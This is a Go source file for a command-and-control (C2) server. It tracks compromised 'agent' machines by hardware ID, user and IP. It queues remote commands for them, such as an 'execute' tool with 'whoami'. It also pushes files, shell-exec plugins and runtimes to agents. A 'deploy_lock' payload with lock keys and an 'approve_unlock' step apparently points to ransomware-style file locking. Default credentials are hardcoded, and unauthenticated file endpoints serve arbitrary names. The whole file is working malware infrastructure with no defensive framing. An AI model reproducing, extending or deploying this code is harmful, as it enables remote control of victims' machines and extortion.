package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"
)

// ═══════════════════════════════════════════════
// C2 Server - Go rewrite
// Features: Agent management, MCP relay, Quiz, Session
// ═══════════════════════════════════════════════

// Agent represents a connected client
type Agent struct {
	HWID      string `json:"hwid"`
	User      string `json:"user"`
	OS        string `json:"os"`
	IP        string `json:"ip"`
	Online    bool   `json:"online"`
	LastSeen  int64  `json:"last_seen"`
}

// AgentRegistry manages all connected agents
type AgentRegistry struct {
	mu     sync.Mutex
	agents map[string]*Agent
}

func NewAgentRegistry() *AgentRegistry {
	return &AgentRegistry{agents: make(map[string]*Agent)}
}

func (r *AgentRegistry) Register(hwid, user, os, ip string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	a, ok := r.agents[hwid]
	if !ok {
		a = &Agent{HWID: hwid}
		r.agents[hwid] = a
	}
	a.User = user
	a.OS = os
	a.IP = ip
	a.Online = true
	a.LastSeen = time.Now().UnixMilli()
	log.Printf("[Agent] Registered: %s user=%s", hwid[:min(12, len(hwid))], user)
}

func (r *AgentRegistry) Heartbeat(hwid string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if a, ok := r.agents[hwid]; ok {
		a.Online = true
		a.LastSeen = time.Now().UnixMilli()
	}
}

func (r *AgentRegistry) GetAll() []Agent {
	r.mu.Lock()
	defer r.mu.Unlock()
	var list []Agent
	for _, a := range r.agents {
		list = append(list, *a)
	}
	return list
}

func (r *AgentRegistry) OnlineCount() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	n := 0
	for _, a := range r.agents {
		if a.Online {
			n++
		}
	}
	return n
}

func (r *AgentRegistry) Cleanup() {
	r.mu.Lock()
	defer r.mu.Unlock()
	now := time.Now().UnixMilli()
	for _, a := range r.agents {
		if a.Online && (now-a.LastSeen) > 60000 {
			a.Online = false
		}
	}
}

// SessionManager handles login/auth
type SessionManager struct {
	mu       sync.Mutex
	user     string
	pass     string
	sessions map[string]int64
}

func NewSessionManager(user, pass string) *SessionManager {
	return &SessionManager{user: user, pass: pass, sessions: make(map[string]int64)}
}

func (s *SessionManager) Login(user, pass string) string {
	if user != s.user || pass != s.pass {
		return ""
	}
	b := make([]byte, 16)
	rand.Read(b)
	token := "sess-" + hex.EncodeToString(b)
	s.mu.Lock()
	s.sessions[token] = time.Now().UnixMilli()
	s.mu.Unlock()
	log.Printf("[Session] Login: %s", user)
	return token
}

func (s *SessionManager) Validate(token string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, ok := s.sessions[token]
	return ok
}

// QuizManager handles quiz bank and scoring
type QuizManager struct {
	mu    sync.Mutex
	bank  QuizBank
	state map[string]*QuizState
}

type QuizBank struct {
	MC        []QuizMC   `json:"mc"`
	Input     []QuizInput `json:"input"`
	PassScore float64    `json:"pass_score"`
}

type QuizMC struct {
	Q    string   `json:"q"`
	Opts []string `json:"opts"`
	Ans  int      `json:"ans"`
	Pts  int      `json:"pts"`
}

type QuizInput struct {
	Q   string `json:"q"`
	Ans string `json:"ans"`
	Pts int    `json:"pts"`
}

type QuizState struct {
	TotalRuns int       `json:"total_runs"`
	UsedMC    []int     `json:"used_mc"`
	UsedInp   []int     `json:"used_inp"`
	Scores    []float64 `json:"scores"`
}

func NewQuizManager() *QuizManager {
	return &QuizManager{state: make(map[string]*QuizState)}
}

func (q *QuizManager) LoadBank(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Printf("[Quiz] Bank not found: %s", path)
		return
	}
	json.Unmarshal(data, &q.bank)
	if q.bank.PassScore == 0 {
		q.bank.PassScore = 70
	}
	log.Printf("[Quiz] Bank loaded: %d MC + %d Input", len(q.bank.MC), len(q.bank.Input))
}

// CommandQueue for agent commands
type CommandQueue struct {
	mu      sync.Mutex
	cmds    map[string][]Command      // hwid -> [Command]
	results map[string]string         // requestId -> result (async)
}

type Command struct {
	RequestID string
	Method    string
	Params    string
}

func NewCommandQueue() *CommandQueue {
	return &CommandQueue{
		cmds:    make(map[string][]Command),
		results: make(map[string]string),
	}
}

func (q *CommandQueue) Enqueue(hwid, method, params string) string {
	q.mu.Lock()
	defer q.mu.Unlock()
	reqID := fmt.Sprintf("req-%d", time.Now().UnixNano())
	q.cmds[hwid] = append(q.cmds[hwid], Command{RequestID: reqID, Method: method, Params: params})
	return reqID
}

func (q *CommandQueue) Dequeue(hwid string) (string, string, string, bool) {
	q.mu.Lock()
	defer q.mu.Unlock()
	cmds, ok := q.cmds[hwid]
	if !ok || len(cmds) == 0 {
		return "", "", "", false
	}
	cmd := cmds[0]
	q.cmds[hwid] = cmds[1:]
	return cmd.RequestID, cmd.Method, cmd.Params, true
}

// StoreResult stores a result keyed by request_id
func (q *CommandQueue) StoreResult(reqID, result string) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.results[reqID] = result
}

// GetResult retrieves and deletes a stored result
func (q *CommandQueue) GetResult(reqID string) (string, bool) {
	q.mu.Lock()
	defer q.mu.Unlock()
	r, ok := q.results[reqID]
	if ok {
		delete(q.results, reqID)
	}
	return r, ok
}

func main() {
	// 环境变量兜底
	port := getEnvInt("C2_PORT", 8080)
	user := getEnv("C2_USER", "admin")
	pass := getEnv("C2_PASS", "c2admin2026")
	quizPath := getEnv("C2_QUIZ", "quiz_bank.json")

	// 子命令派发
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "serve":
			runServer(port, user, pass, quizPath, os.Args[2:])
			return
		case "agent":
			runAgentCmd(os.Args[2:])
			return
		case "mcp":
			runMcpCmd(os.Args[2:])
			return
		case "version":
			fmt.Println("C2 Server v1.0.0")
			return
		case "help", "-h", "--help":
			printUsage()
			return
		}
	}
	// 无参数默认 serve（兼容旧脚本）
	runServer(port, user, pass, quizPath, nil)
}

func getEnv(key, def string) string {
	if v := os.Getenv(key); v != "" { return v }
	return def
}
func getEnvInt(key string, def int) int {
	if v := os.Getenv(key); v != "" {
		if i, err := strconv.Atoi(v); err == nil { return i }
	}
	return def
}

func printUsage() {
	fmt.Println(`C2 Server - 命令行用法:
  c2-server serve [--port N] [--user U] [--pass P] [--quiz FILE]  启动服务端
  c2-server agent list                                              列出在线 Agent
  c2-server agent info <hwid>                                       查看 Agent 详情
  c2-server mcp call <hwid> <tool> <json-args>                      调用 MCP 工具（同步等待结果）
  c2-server version                                                 显示版本
  c2-server help                                                    显示帮助

环境变量兜底: C2_PORT C2_USER C2_PASS C2_QUIZ
示例:
  c2-server serve --port 8080
  c2-server agent list
  c2-server mcp call BCA92F84 execute '{"command":"whoami"}'
`)
}

func runServer(port int, user, pass, quizPath string, extraArgs []string) {
	// 解析 serve 子命令的额外参数
	for i := 0; i < len(extraArgs); i++ {
		switch extraArgs[i] {
		case "--port":
			if i+1 < len(extraArgs) { port, _ = strconv.Atoi(extraArgs[i+1]); i++ }
		case "--user":
			if i+1 < len(extraArgs) { user = extraArgs[i+1]; i++ }
		case "--pass":
			if i+1 < len(extraArgs) { pass = extraArgs[i+1]; i++ }
		case "--quiz":
			if i+1 < len(extraArgs) { quizPath = extraArgs[i+1]; i++ }
		}
	}

	agents := NewAgentRegistry()
	sessions := NewSessionManager(user, pass)
	quiz := NewQuizManager()
	quiz.LoadBank(quizPath)
	cmds := NewCommandQueue()

	// ... 后面保持原有 HTTP 路由不变 ...

	// Cleanup goroutine
	go func() {
		for {
			time.Sleep(30 * time.Second)
			agents.Cleanup()
		}
	}()

	mux := http.NewServeMux()

	// Login
	mux.HandleFunc("/api/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" { writeJSON(w, 405, map[string]string{"error": "POST required"}); return }
		var body struct{ User, Pass string }
		json.NewDecoder(r.Body).Decode(&body)
		token := sessions.Login(body.User, body.Pass)
		if token == "" {
			writeJSON(w, 401, map[string]string{"error": "bad credentials"})
			return
		}
		http.SetCookie(w, &http.Cookie{Name: "c2session", Value: token, Path: "/", HttpOnly: true})
		writeJSON(w, 200, map[string]bool{"ok": true})
	})

	// Status
	mux.HandleFunc("/api/status", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		writeJSON(w, 200, map[string]int{"agents_online": agents.OnlineCount(), "agents_total": len(agents.GetAll())})
	})

	// Agents
	mux.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		writeJSON(w, 200, agents.GetAll())
	})

	// Agent register
	mux.HandleFunc("/api/agent/register", func(w http.ResponseWriter, r *http.Request) {
		bodyBytes, _ := io.ReadAll(r.Body)
		log.Printf("[Server] Register raw body: %s", string(bodyBytes))
		var body map[string]interface{}
		json.Unmarshal(bodyBytes, &body)
		hwid, _ := body["hwid"].(string)
		user, _ := body["user"].(string)
		osName, _ := body["os"].(string)
		// Handle nested info object from Client Stub
		if user == "" {
			if info, ok := body["info"].(map[string]interface{}); ok {
				user, _ = info["user"].(string)
				osName, _ = info["os"].(string)
			}
		}
		log.Printf("[Server] Register: hwid=%s user=%s os=%s ip=%s", hwid, user, osName, r.RemoteAddr)
		agents.Register(hwid, user, osName, r.RemoteAddr)
		writeJSON(w, 200, map[string]bool{"ok": true})
	})

	// Heartbeat
	mux.HandleFunc("/api/heartbeat", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]interface{}
		json.NewDecoder(r.Body).Decode(&body)
		if hwid, ok := body["hwid"].(string); ok {
			agents.Heartbeat(hwid)
		}
		writeJSON(w, 200, map[string]bool{"ok": true})
	})

	// Agent poll
	mux.HandleFunc("/api/agent/poll", func(w http.ResponseWriter, r *http.Request) {
		bodyBytes, _ := io.ReadAll(r.Body)
		log.Printf("[Server] Poll raw body: %s", string(bodyBytes))
		
		var body map[string]interface{}
		json.Unmarshal(bodyBytes, &body)
		hwid, _ := body["hwid"].(string)
		log.Printf("[Server] Poll parsed HWID: '%s'", hwid)
		agents.Heartbeat(hwid)
		reqID, method, params, ok := cmds.Dequeue(hwid)
		if ok {
			log.Printf("[Server] Dequeue command for %s: reqID=%s method=%s", hwid, reqID, method)
			writeJSON(w, 200, map[string]interface{}{"request_id": reqID, "method": method, "params": json.RawMessage(params)})
		} else {
			log.Printf("[Server] No command for %s", hwid)
			w.Write([]byte("{}"))
		}
	})

	// Agent result (client posts result back)
	mux.HandleFunc("/api/agent/result", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			log.Printf("[Server] Result decode error: %v", err)
			writeJSON(w, 400, map[string]string{"error": "bad request"})
			return
		}
		reqID, _ := body["request_id"].(string)
		// Result can be string or object — marshal to string for storage
		resultBytes, _ := json.Marshal(body["result"])
		resultStr := string(resultBytes)
		log.Printf("[Server] Result received: reqID=%s len=%d", reqID, len(resultStr))
		cmds.StoreResult(reqID, resultStr)
		writeJSON(w, 200, map[string]bool{"ok": true})
	})

	// MCP tool call (async: enqueue + return request_id)
	mux.HandleFunc("/api/mcp", func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if e := recover(); e != nil {
				log.Printf("[Server] MCP panic: %v", e)
				writeJSON(w, 500, map[string]interface{}{"ok": false, "error": "internal error"})
			}
		}()
		if !checkAuth(r, sessions) { 
			log.Printf("[Server] MCP auth failed")
			writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return 
		}
		var body struct {
			AgentHWID  string          `json:"agent_hwid"`
			Name       string          `json:"name"`
			Arguments  json.RawMessage `json:"arguments"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			log.Printf("[Server] MCP decode error: %v", err)
			writeJSON(w, 400, map[string]string{"error": "bad request"})
			return
		}
		log.Printf("[Server] MCP request: hwid=%s name=%s args=%s", body.AgentHWID, body.Name, string(body.Arguments))
		if body.AgentHWID == "" || body.Name == "" {
			writeJSON(w, 400, map[string]string{"error": "missing hwid or name"})
			return
		}
		rpcParams, _ := json.Marshal(map[string]interface{}{"name": body.Name, "arguments": body.Arguments})
		reqID := cmds.Enqueue(body.AgentHWID, "tools/call", string(rpcParams))
		log.Printf("[Server] MCP enqueue for %s: reqID=%s name=%s", body.AgentHWID, reqID, body.Name)
		writeJSON(w, 200, map[string]interface{}{"ok": true, "request_id": reqID})
	})

	// MCP poll result (CLI polls this after sending /api/mcp)
	mux.HandleFunc("/api/mcp/result", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		reqID := r.URL.Query().Get("request_id")
		if reqID == "" {
			writeJSON(w, 400, map[string]string{"error": "missing request_id"})
			return
		}
		result, ok := cmds.GetResult(reqID)
		if ok {
			writeJSON(w, 200, map[string]interface{}{"ok": true, "result": json.RawMessage(result)})
		} else {
			writeJSON(w, 200, map[string]interface{}{"ok": false, "status": "pending"})
		}
	})

	// Quiz bank info
	mux.HandleFunc("/api/quiz_bank", func(w http.ResponseWriter, r *http.Request) {
		writeJSON(w, 200, map[string]interface{}{
			"total_mc":  len(quiz.bank.MC),
			"total_input": len(quiz.bank.Input),
		})
	})

	// ═══ File Store path ═══
	// 优先用环境变量，否则用可执行文件同级目录下的 filestore/
	filestoreDir := func() string {
		if v := os.Getenv("C2_FILESTORE"); v != "" { return v }
		exePath, _ := os.Executable()
		return filepath.Join(filepath.Dir(exePath), "filestore")
	}()

	// ═══ Runtime Sync ═══
	// Agent pulls embedded runtime (Python/Node) — no auth
	mux.HandleFunc("/api/runtime", func(w http.ResponseWriter, r *http.Request) {
		// 列出可用运行时
		var runtimes []map[string]interface{}
		entries, _ := os.ReadDir(filestoreDir)
		for _, e := range entries {
			if e.IsDir() { continue }
			name := e.Name()
			// 只暴露 python/node 嵌入式包
			if len(name) > 4 && (name[:6] == "python" || name[:4] == "node") && name[len(name)-4:] == ".zip" {
				info, _ := e.Info()
				runtimes = append(runtimes, map[string]interface{}{
					"name": name, "size": info.Size(),
				})
			}
		}
		writeJSON(w, 200, runtimes)
	})
	mux.HandleFunc("/api/runtime/get", func(w http.ResponseWriter, r *http.Request) {
		name := r.URL.Query().Get("name")
		if name == "" { writeJSON(w, 400, map[string]string{"error": "missing name"}); return }
		path := filepath.Join(filestoreDir, name)
		info, err := os.Stat(path)
		if err != nil { writeJSON(w, 404, map[string]string{"error": "not found"}); return }
		w.Header().Set("Content-Disposition", "attachment; filename="+name)
		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))
		http.ServeFile(w, r, path)
	})

	// ═══ Plugin Sync ═══
	// Agent pulls plugin list from server (no auth — agent is trusted once connected)
	mux.HandleFunc("/api/plugins", func(w http.ResponseWriter, r *http.Request) {
		pluginDir := filepath.Join(filestoreDir, "plugins")
		entries, err := os.ReadDir(pluginDir)
		if err != nil {
			// 也检查根 filestore 下有没有直接的 plugin 目录
			pluginDir = filestoreDir
			entries, err = os.ReadDir(pluginDir)
			if err != nil {
				writeJSON(w, 200, []interface{}{})
				return
			}
		}
		var plugins []map[string]interface{}
		for _, e := range entries {
			if !e.IsDir() {
				// 非目录文件，跳过
				continue
			}
			// 检查目录下有没有 plugin.json
			pjson := filepath.Join(pluginDir, e.Name(), "plugin.json")
			if _, err := os.Stat(pjson); err != nil {
				continue
			}
			// 读取 plugin.json 获取 name/version
			data, err := os.ReadFile(pjson)
			if err != nil {
				continue
			}
			var meta struct {
				Name        string `json:"name"`
				Version     string `json:"version"`
				Command     string `json:"command"`
				Description string `json:"description"`
			}
			json.Unmarshal(data, &meta)
			plugins = append(plugins, map[string]interface{}{
				"id":          e.Name(),
				"name":        meta.Name,
				"version":     meta.Version,
				"command":     meta.Command,
				"description": meta.Description,
			})
		}
		writeJSON(w, 200, plugins)
	})

	// Agent pulls a file from plugin directory (no auth — agent connected)
	mux.HandleFunc("/api/plugins/get", func(w http.ResponseWriter, r *http.Request) {
		name := r.URL.Query().Get("name") // e.g. "shell_exec/plugin.json"
		if name == "" { writeJSON(w, 400, map[string]string{"error": "missing name"}); return }
		// 也检查 filestore/plugins/ 和 filestore/ 根目录
		path := filepath.Join(filestoreDir, "plugins", name)
		if _, err := os.Stat(path); err != nil {
			path = filepath.Join(filestoreDir, name)
		}
		info, err := os.Stat(path)
		if err != nil { writeJSON(w, 404, map[string]string{"error": "not found: " + name}); return }
		w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(name))
		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))
		http.ServeFile(w, r, path)
	})

	// Payload deploy
	mux.HandleFunc("/api/payload", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		var body struct {
			AgentHWID  string `json:"agent_hwid"`
			ServerFile string `json:"server_file"`
			Task       string `json:"task"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		lockKey := genKey(8)
		cmdData, _ := json.Marshal(map[string]string{"file": body.ServerFile, "pass": lockKey, "hwid": body.AgentHWID})
		cmds.Enqueue(body.AgentHWID, "deploy_lock", string(cmdData))
		writeJSON(w, 200, map[string]interface{}{"ok": true, "lock_key": lockKey, "payload": body.ServerFile})
	})

	// Approve unlock
	mux.HandleFunc("/api/lock_keys/approve", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		var body struct{ HWID string `json:"hwid"` }
		json.NewDecoder(r.Body).Decode(&body)
		cmds.Enqueue(body.HWID, "approve_unlock", "{}")
		writeJSON(w, 200, map[string]interface{}{"ok": true, "approved": true})
	})

	// ═══ File Store ═══

	// List files
	mux.HandleFunc("/api/files", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		entries, err := os.ReadDir(filestoreDir)
		if err != nil { writeJSON(w, 500, map[string]string{"error": "read dir failed"}); return }
		var files []map[string]interface{}
		for _, e := range entries {
			info, _ := e.Info()
			files = append(files, map[string]interface{}{
				"name": e.Name(), "size": info.Size(), "mod_time": info.ModTime().Unix(),
			})
		}
		writeJSON(w, 200, files)
	})

	// Download file (panel/CLI pulls this)
	mux.HandleFunc("/api/files/download", func(w http.ResponseWriter, r *http.Request) {
		name := r.URL.Query().Get("name")
		if name == "" { writeJSON(w, 400, map[string]string{"error": "missing name"}); return }
		path := filepath.Join(filestoreDir, name)
		info, err := os.Stat(path)
		if err != nil { writeJSON(w, 404, map[string]string{"error": "not found"}); return }
		w.Header().Set("Content-Disposition", "attachment; filename="+name)
		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))
		http.ServeFile(w, r, path)
	})

	// Upload file (panel pushes this)
	mux.HandleFunc("/api/files/upload", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		file, handler, err := r.FormFile("file")
		if err != nil { writeJSON(w, 400, map[string]string{"error": "no file"}); return }
		defer file.Close()
		dst, err := os.Create(filepath.Join(filestoreDir, handler.Filename))
		if err != nil { writeJSON(w, 500, map[string]string{"error": "create failed"}); return }
		defer dst.Close()
		io.Copy(dst, file)
		log.Printf("[Server] File uploaded: %s (%d bytes)", handler.Filename, handler.Size)
		writeJSON(w, 200, map[string]interface{}{"ok": true, "name": handler.Filename, "size": handler.Size})
	})

	// Deploy file to agent (enqueue download command)
	mux.HandleFunc("/api/files/deploy", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
		var body struct {
			AgentHWID string `json:"agent_hwid"`
			FileName  string `json:"file_name"`
			TargetDir string `json:"target_dir"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		cmdData, _ := json.Marshal(body)
		cmds.Enqueue(body.AgentHWID, "deploy_file", string(cmdData))
		writeJSON(w, 200, map[string]interface{}{"ok": true, "status": "dispatched"})
	})

	// Download file (agent pulls this — no auth, just name)
	mux.HandleFunc("/api/files/get", func(w http.ResponseWriter, r *http.Request) {
		name := r.URL.Query().Get("name")
		if name == "" { writeJSON(w, 400, map[string]string{"error": "missing name"}); return }
		path := filepath.Join(filestoreDir, name)
		info, err := os.Stat(path)
		if err != nil { writeJSON(w, 404, map[string]string{"error": "not found"}); return }
		w.Header().Set("Content-Disposition", "attachment; filename="+name)
		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))
		http.ServeFile(w, r, path)
	})

	log.Printf("[Server] Starting on port %d", port)
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", port), mux))
}

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(v)
}

func checkAuth(r *http.Request, s *SessionManager) bool {
	for _, c := range r.Cookies() {
		if c.Name == "c2session" && s.Validate(c.Value) {
			return true
		}
	}
	return false
}

func genKey(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)[:n]
}

func min(a, b int) int {
	if a < b { return a }
	return b
}

// ========== CLI 子命令实现 ==========

func runAgentCmd(args []string) {
	if len(args) < 1 {
		fmt.Println("用法: c2-server agent list|info <hwid>")
		os.Exit(1)
	}
	base := getEnv("C2_API", "http://127.0.0.1:8080")
	token := login(base)
	if token == "" {
		fmt.Fprintln(os.Stderr, "登录失败")
		os.Exit(1)
	}
	switch args[0] {
	case "list":
		resp := getJSON(base+"/api/agents", token)
		fmt.Println(string(resp))
	case "info":
		if len(args) < 2 { fmt.Println("需提供 hwid"); os.Exit(1) }
		resp := getJSON(base+"/api/agents", token)
		var agents []map[string]interface{}
		json.Unmarshal(resp, &agents)
		for _, a := range agents {
			if a["hwid"] == args[1] {
				fmt.Println(string(resp))
				return
			}
		}
		fmt.Println("{}")
	default:
		fmt.Println("未知子命令:", args[0])
	}
}

func runMcpCmd(args []string) {
	if len(args) < 3 {
		fmt.Println("用法: c2-server mcp call <hwid> <tool> <json-args>")
		os.Exit(1)
	}
	if args[0] != "call" {
		fmt.Println("仅支持 call 子命令")
		os.Exit(1)
	}
	base := getEnv("C2_API", "http://127.0.0.1:8080")
	token := login(base)
	if token == "" {
		fmt.Fprintln(os.Stderr, "登录失败")
		os.Exit(1)
	}
	hwid, tool, toolArgs := args[1], args[2], args[3]
	body := map[string]interface{}{
		"agent_hwid": hwid,
		"name":       tool,
		"arguments":  json.RawMessage(toolArgs),
	}
	resp := postJSON(base+"/api/mcp", token, body)
	// Parse request_id from response
	var mcpResp struct {
		OK        bool   `json:"ok"`
		RequestID string `json:"request_id"`
		Error     string `json:"error"`
	}
	json.Unmarshal(resp, &mcpResp)
	if !mcpResp.OK {
		fmt.Println(string(resp))
		os.Exit(1)
	}
	// Poll for result (max 30s)
	fmt.Fprintf(os.Stderr, "request_id=%s, waiting for result...\n", mcpResp.RequestID)
	for i := 0; i < 60; i++ {
		time.Sleep(500 * time.Millisecond)
		resultURL := base + "/api/mcp/result?request_id=" + mcpResp.RequestID
		resultResp := getJSON(resultURL, token)
		var pollResp struct {
			OK     bool            `json:"ok"`
			Status string          `json:"status"`
			Result json.RawMessage `json:"result"`
		}
		json.Unmarshal(resultResp, &pollResp)
		if pollResp.OK {
			fmt.Println(string(pollResp.Result))
			return
		}
	}
	fmt.Fprintln(os.Stderr, "超时（30秒）")
	os.Exit(1)
}

func login(base string) string {
	user := getEnv("C2_USER", "admin")
	pass := getEnv("C2_PASS", "c2admin2026")
	data, _ := json.Marshal(map[string]string{"user": user, "pass": pass})
	req, _ := http.NewRequest("POST", base+"/api/login", bytes.NewReader(data))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil { return "" }
	defer resp.Body.Close()
	// 从 Set-Cookie 拿 token
	for _, c := range resp.Cookies() {
		if c.Name == "c2session" {
			return c.Value
		}
	}
	return ""
}

func getJSON(url, token string) []byte {
	req, _ := http.NewRequest("GET", url, nil)
	if token != "" { req.Header.Set("Cookie", "c2session="+token) }
	resp, _ := http.DefaultClient.Do(req)
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return data
}

func postJSON(url, token string, body interface{}) []byte {
	data, _ := json.Marshal(body)
	req, _ := http.NewRequest("POST", url, bytes.NewReader(data))
	req.Header.Set("Content-Type", "application/json")
	if token != "" { req.Header.Set("Cookie", "c2session="+token) }
	resp, _ := http.DefaultClient.Do(req)
	defer resp.Body.Close()
	out, _ := io.ReadAll(resp.Body)
	return out
}
